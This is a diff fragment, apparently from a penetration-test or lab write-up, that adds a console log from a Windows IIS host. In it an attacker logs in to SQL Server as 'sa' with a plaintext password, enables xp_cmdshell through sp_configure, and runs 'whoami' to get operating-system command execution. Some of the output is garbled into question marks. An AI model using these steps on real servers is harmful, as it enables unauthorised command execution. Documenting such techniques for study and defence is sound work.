@@ -143,6 +143,30 @@ name
 
 (0 rows affected)
 
+
+c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE sp_configure 'show advanced options', 1;"
+sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE sp_configure 'show advanced options', 1;"
+
+??????? 'show advanced options' ? 0 ?? 1 ?????????RECONFIGURE ?????????????????????????
+
+c:\windows\system32\inetsrv>
+c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "RECONFIGURE;"
+sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "RECONFIGURE;"
+
+c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE sp_configure 'xp_cmdshell', 1;"
+sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE sp_configure 'xp_cmdshell', 1;"
+??????? 'xp_cmdshell' ? 0 ?? 1 ?????????RECONFIGURE ?????????????????????????
+
+c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "RECONFIGURE;"
+sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "RECONFIGURE;"
+
+c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE xp_cmdshell 'whoami';"
+sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE xp_cmdshell 'whoami';"
+output                                                                        
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+nt service\mssqlserver                                                        
+NULL                                                                          
+(2 rows affected)
 ```
 
 
